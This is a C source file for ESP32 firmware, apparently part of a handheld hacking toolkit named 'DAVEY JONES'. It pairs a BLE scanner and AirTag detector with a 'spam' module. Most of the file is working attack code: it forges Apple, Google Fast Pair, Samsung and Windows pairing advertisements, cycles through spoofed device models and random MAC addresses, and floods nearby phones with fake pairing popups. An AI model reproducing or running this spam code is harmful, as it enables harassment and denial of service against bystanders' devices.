/*
 * nesso_ble.c — Full BLE toolkit for DAVEY JONES.
 *
 * Scanner: continuous passive scan with device type detection.
 * Spam: Apple/Samsung/Google/Windows with 20+ device models.
 * AirTag detector: finds nearby Apple/Samsung/Tile trackers.
 */

#include <string.h>
#include <stdlib.h>

#include "esp_check.h"
#include "esp_log.h"
#include "esp_random.h"
#include "esp_bt.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"
#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "host/util/util.h"

#include "nesso_ble.h"

static const char *TAG = "nesso_ble";

static bool s_initted = false;
static bool s_spam_running = false;
static TaskHandle_t s_spam_task = NULL;
static nesso_ble_spam_type_t s_spam_type;
static uint32_t s_spam_count = 0;

/* -------------------- NimBLE host -------------------- */

static void ble_host_task(void *param)
{
    (void)param;
    nimble_port_run();
    nimble_port_freertos_deinit();
}

static void ble_on_sync(void) { ble_hs_util_ensure_addr(0); }
static void ble_on_reset(int reason) { (void)reason; }

/* -------------------- init -------------------- */

esp_err_t nesso_ble_init(void)
{
    if (s_initted) return ESP_OK;

    ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT));

    esp_err_t err = nimble_port_init();
    if (err != ESP_OK) return err;

    ble_hs_cfg.sync_cb = ble_on_sync;
    ble_hs_cfg.reset_cb = ble_on_reset;
    nimble_port_freertos_init(ble_host_task);

    for (int i = 0; i < 50 && !ble_hs_synced(); ++i)
        vTaskDelay(pdMS_TO_TICKS(100));

    if (!ble_hs_synced()) return ESP_ERR_TIMEOUT;

    s_initted = true;
    ESP_LOGI(TAG, "BLE ready");
    return ESP_OK;
}

esp_err_t nesso_ble_deinit(void)
{
    if (!s_initted) return ESP_OK;
    if (s_spam_running) nesso_ble_spam_stop();
    nimble_port_stop();
    nimble_port_deinit();
    s_initted = false;
    return ESP_OK;
}

bool nesso_ble_is_ready(void) { return s_initted; }
uint32_t nesso_ble_spam_sent(void) { return s_spam_count; }

/* -------------------- scanner -------------------- */

static nesso_ble_scan_result_t *s_scan_out = NULL;
static SemaphoreHandle_t s_scan_done = NULL;

static int find_device(const nesso_ble_scan_result_t *r, const uint8_t *addr)
{
    for (size_t i = 0; i < r->count; ++i)
        if (memcmp(r->devices[i].addr, addr, 6) == 0) return (int)i;
    return -1;
}

/* Guess device type from advertisement data. */
static const char *guess_type(const uint8_t *data, uint8_t len)
{
    /* Look for Apple manufacturer data (0x4C00). */
    for (int i = 0; i + 4 < len; ++i) {
        if (data[i] == 0xFF && i + 1 < len) {
            uint8_t mfr_len = data[i - 1];
            if (i >= 1 && data[i + 1] == 0x4C && data[i + 2] == 0x00) {
                if (mfr_len > 4 && data[i + 3] == 0x07) return "AirPod";
                if (mfr_len > 4 && data[i + 3] == 0x12) return "AirTag";
                return "Apple";
            }
            if (i >= 1 && data[i + 1] == 0x75 && data[i + 2] == 0x00)
                return "Samsung";
            if (i >= 1 && data[i + 1] == 0x06 && data[i + 2] == 0x00)
                return "MS";
        }
    }
    /* Check for common service UUIDs. */
    for (int i = 0; i + 3 < len; ++i) {
        if (data[i] == 0x03 && data[i + 1] == 0x03) {
            uint16_t uuid = data[i + 2] | (data[i + 3] << 8);
            if (uuid == 0xFE2C) return "FastPair";
            if (uuid == 0xFD6F) return "Exposure";  /* COVID tracker */
            if (uuid == 0x180F) return "Battery";
            if (uuid == 0x180D) return "HRM";
            if (uuid == 0x1812) return "HID";
        }
    }
    return "BLE";
}

static int scan_event_cb(struct ble_gap_event *event, void *arg)
{
    (void)arg;
    if (event->type == BLE_GAP_EVENT_DISC) {
        const struct ble_gap_disc_desc *desc = &event->disc;
        if (!s_scan_out) return 0;

        int idx = find_device(s_scan_out, desc->addr.val);
        if (idx >= 0) {
            if (desc->rssi > s_scan_out->devices[idx].rssi)
                s_scan_out->devices[idx].rssi = desc->rssi;
            return 0;
        }

        if (s_scan_out->count >= BLE_SCAN_MAX_DEVICES) return 0;

        nesso_ble_device_t *dev = &s_scan_out->devices[s_scan_out->count];
        memcpy(dev->addr, desc->addr.val, 6);
        dev->rssi = desc->rssi;
        dev->addr_type = desc->addr.type;
        dev->name[0] = '\0';
        dev->type[0] = '\0';

        struct ble_hs_adv_fields fields;
        if (ble_hs_adv_parse_fields(&fields, desc->data, desc->length_data) == 0) {
            if (fields.name != NULL && fields.name_len > 0) {
                size_t n = fields.name_len < 19 ? fields.name_len : 19;
                memcpy(dev->name, fields.name, n);
                dev->name[n] = '\0';
            }
        }

        /* Device type from raw adv data. */
        const char *type = guess_type(desc->data, desc->length_data);
        strncpy(dev->type, type, sizeof(dev->type) - 1);

        /* Is it a tracker? */
        dev->is_tracker = (strcmp(type, "AirTag") == 0);

        s_scan_out->count++;

    } else if (event->type == BLE_GAP_EVENT_DISC_COMPLETE) {
        if (s_scan_done) xSemaphoreGive(s_scan_done);
    }
    return 0;
}

esp_err_t nesso_ble_scan(uint32_t duration_sec, nesso_ble_scan_result_t *out)
{
    if (!s_initted) return ESP_ERR_INVALID_STATE;
    if (!out) return ESP_ERR_INVALID_ARG;
    if (s_spam_running) nesso_ble_spam_stop();

    memset(out, 0, sizeof(*out));
    s_scan_out = out;
    if (!s_scan_done) s_scan_done = xSemaphoreCreateBinary();

    struct ble_gap_disc_params params = {
        .itvl = 0, .window = 0,
        .filter_policy = BLE_HCI_SCAN_FILT_NO_WL,
        .limited = 0, .passive = 1, .filter_duplicates = 0,
    };

    int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, duration_sec * 1000,
                          &params, scan_event_cb, NULL);
    if (rc != 0) { s_scan_out = NULL; return ESP_FAIL; }

    xSemaphoreTake(s_scan_done, pdMS_TO_TICKS(duration_sec * 1000 + 2000));
    s_scan_out = NULL;

    /* Sort by RSSI descending. */
    for (size_t i = 1; i < out->count; ++i) {
        nesso_ble_device_t tmp = out->devices[i];
        size_t j = i;
        while (j > 0 && out->devices[j - 1].rssi < tmp.rssi) {
            out->devices[j] = out->devices[j - 1]; --j;
        }
        out->devices[j] = tmp;
    }

    ESP_LOGI(TAG, "scan: %zu devices", out->count);
    return ESP_OK;
}

/* -------------------- spam -------------------- */

/*
 * Apple Proximity Pairing — 20+ device model IDs.
 * The model byte at offset 7 determines the popup shown on iPhones.
 */
static const uint8_t s_apple_models[] = {
    0x01,  /* AirPods */
    0x02,  /* AirPods Pro */
    0x03,  /* AirPods Max */
    0x05,  /* Beats X */
    0x06,  /* Beats Solo 3 */
    0x07,  /* Beats Studio 3 */
    0x09,  /* Beats Studio Pro */
    0x0A,  /* Beats Fit Pro */
    0x0B,  /* Beats Flex */
    0x0C,  /* Beats Solo Pro */
    0x0D,  /* Beats Studio Buds */
    0x0E,  /* Beats Studio Buds+ */
    0x0F,  /* AirPods Gen 2 */
    0x10,  /* AirPods Gen 3 */
    0x13,  /* AirPods Pro Gen 2 */
    0x14,  /* AirPods Pro Gen 2 (USB-C) */
    0x19,  /* PowerBeats Pro */
    0x04,  /* AppleTV Setup */
    0x06,  /* HomePod */
    0x0B,  /* Apple Vision Pro */
};
#define APPLE_MODEL_COUNT (sizeof(s_apple_models) / sizeof(s_apple_models[0]))

/* Build an Apple proximity pairing advertisement. */
static int build_apple_adv(uint8_t *buf, uint8_t model)
{
    uint8_t adv[] = {
        0x1e, 0xff, 0x4c, 0x00,  /* Apple company ID */
        0x07, 0x19,               /* Proximity Pairing */
        0x07,                     /* status */
        model,                    /* device model */
        0x20, 0x75, 0xaa, 0x30,  /* random bytes */
        0x01, 0x00, 0x00, 0x45,
        0x12, 0x12, 0x12, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00,
    };
    /* Randomize some bytes for variety. */
    adv[8]  = (uint8_t)(esp_random() & 0xFF);
    adv[9]  = (uint8_t)(esp_random() & 0xFF);
    adv[10] = (uint8_t)(esp_random() & 0xFF);
    adv[11] = (uint8_t)(esp_random() & 0xFF);

    memcpy(buf, adv, sizeof(adv));
    return sizeof(adv);
}

/* Google Fast Pair — multiple model IDs. */
static const uint8_t s_google_models[][3] = {
    { 0x00, 0x01, 0x02 },  /* generic */
    { 0x2C, 0x01, 0x00 },  /* Pixel Buds */
    { 0x00, 0x0A, 0x01 },  /* JBL */
    { 0x98, 0x00, 0x01 },  /* Sony */
};
#define GOOGLE_MODEL_COUNT 4

static int build_google_adv(uint8_t *buf, int model_idx)
{
    uint8_t adv[] = {
        0x02, 0x01, 0x06,
        0x03, 0x03, 0x2c, 0xfe,
        0x06, 0x16, 0x2c, 0xfe,
        0x00, 0x00, 0x00,
    };
    adv[11] = s_google_models[model_idx % GOOGLE_MODEL_COUNT][0];
    adv[12] = s_google_models[model_idx % GOOGLE_MODEL_COUNT][1];
    adv[13] = s_google_models[model_idx % GOOGLE_MODEL_COUNT][2];
    memcpy(buf, adv, sizeof(adv));
    return sizeof(adv);
}

static const uint8_t s_samsung_adv[] = {
    0x02, 0x01, 0x06,
    0x0f, 0xff, 0x75, 0x00,
    0x01, 0x00, 0x02, 0x00, 0x01, 0x01,
    0x03, 0x00, 0x00, 0x00, 0x00, 0x00,
};

static const uint8_t s_windows_adv[] = {
    0x02, 0x01, 0x06,
    0x06, 0xff, 0x06, 0x00, 0x03, 0x00, 0x80,
};

static void set_random_addr(void)
{
    uint8_t addr[6];
    for (int i = 0; i < 6; ++i) addr[i] = (uint8_t)(esp_random() & 0xFF);
    addr[0] |= 0xC0;
    ble_hs_id_set_rnd(addr);
}

static esp_err_t send_adv(const uint8_t *data, size_t len, uint32_t duration_ms)
{
    struct ble_gap_adv_params adv_params = {
        .conn_mode = BLE_GAP_CONN_MODE_NON,
        .disc_mode = BLE_GAP_DISC_MODE_GEN,
        .itvl_min = 0x20,
        .itvl_max = 0x40,
    };
    set_random_addr();
    if (ble_gap_adv_set_data(data, (int)len) != 0) return ESP_FAIL;
    if (ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, duration_ms,
                          &adv_params, NULL, NULL) != 0) return ESP_FAIL;
    vTaskDelay(pdMS_TO_TICKS(duration_ms));
    ble_gap_adv_stop();
    return ESP_OK;
}

static void spam_task(void *arg)
{
    (void)arg;
    uint8_t buf[31];
    int variant = 0;
    s_spam_count = 0;

    while (s_spam_running) {
        int len = 0;

        switch (s_spam_type) {
        case BLE_SPAM_APPLE:
            len = build_apple_adv(buf, s_apple_models[variant % APPLE_MODEL_COUNT]);
            variant++;
            break;
        case BLE_SPAM_SAMSUNG:
            memcpy(buf, s_samsung_adv, sizeof(s_samsung_adv));
            len = sizeof(s_samsung_adv);
            break;
        case BLE_SPAM_GOOGLE:
            len = build_google_adv(buf, variant++);
            break;
        case BLE_SPAM_WINDOWS:
            memcpy(buf, s_windows_adv, sizeof(s_windows_adv));
            len = sizeof(s_windows_adv);
            break;
        case BLE_SPAM_ALL:
        default:
            switch (variant % 4) {
            case 0:
                len = build_apple_adv(buf,
                    s_apple_models[esp_random() % APPLE_MODEL_COUNT]);
                break;
            case 1:
                memcpy(buf, s_samsung_adv, sizeof(s_samsung_adv));
                len = sizeof(s_samsung_adv);
                break;
            case 2:
                len = build_google_adv(buf, esp_random() % GOOGLE_MODEL_COUNT);
                break;
            case 3:
                memcpy(buf, s_windows_adv, sizeof(s_windows_adv));
                len = sizeof(s_windows_adv);
                break;
            }
            variant++;
            break;
        }

        if (len > 0) {
            send_adv(buf, len, 50);
            s_spam_count++;
        }
        vTaskDelay(pdMS_TO_TICKS(20));
    }

    s_spam_task = NULL;
    vTaskDelete(NULL);
}

esp_err_t nesso_ble_spam_start(nesso_ble_spam_type_t type)
{
    if (!s_initted) return ESP_ERR_INVALID_STATE;
    if (s_spam_running) return ESP_OK;

    s_spam_type = type;
    s_spam_running = true;
    s_spam_count = 0;

    BaseType_t ok = xTaskCreate(spam_task, "ble_spam", 4096, NULL, 5, &s_spam_task);
    if (ok != pdPASS) { s_spam_running = false; return ESP_ERR_NO_MEM; }

    return ESP_OK;
}

esp_err_t nesso_ble_spam_stop(void)
{
    if (!s_spam_running) return ESP_OK;
    s_spam_running = false;
    ble_gap_adv_stop();
    for (int i = 0; i < 20 && s_spam_task; ++i) vTaskDelay(pdMS_TO_TICKS(50));
    return ESP_OK;
}

bool nesso_ble_spam_is_active(void) { return s_spam_running; }
